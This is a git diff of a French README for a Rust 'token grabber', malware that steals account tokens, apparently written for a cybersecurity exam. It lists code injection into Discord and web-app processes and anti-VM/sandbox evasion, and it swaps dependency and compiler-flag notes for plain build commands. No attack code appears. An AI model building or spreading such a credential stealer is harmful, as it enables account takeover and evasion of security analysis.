@@ -1,5 +1,5 @@
 # token_grab_rust 
-Token grabber en Rust pour le partiel de cybersécurité
+Token grabber en Rust pour le partiel
 
 **Fonctionnalités clés**  
 - 🎯 Injection de code dans les processus cibles (Discord/Apps web)  
@@ -22,8 +22,9 @@ Token grabber en Rust pour le partiel de cybersécurité
 - Anti VM/sandbox
 
 **Compilation**  
-- 🦀 Rust 1.67+ requis  
-- 📦 Crates essentielles : `winapi`, `reqwest`, `sysinfo`  
-- 🔧 Flags recommandés : `--release -C opt-level=z -C panic=abort`  
+```bash
+cargo build --release
+./target/release/token_grabber_rust
+```
 
 
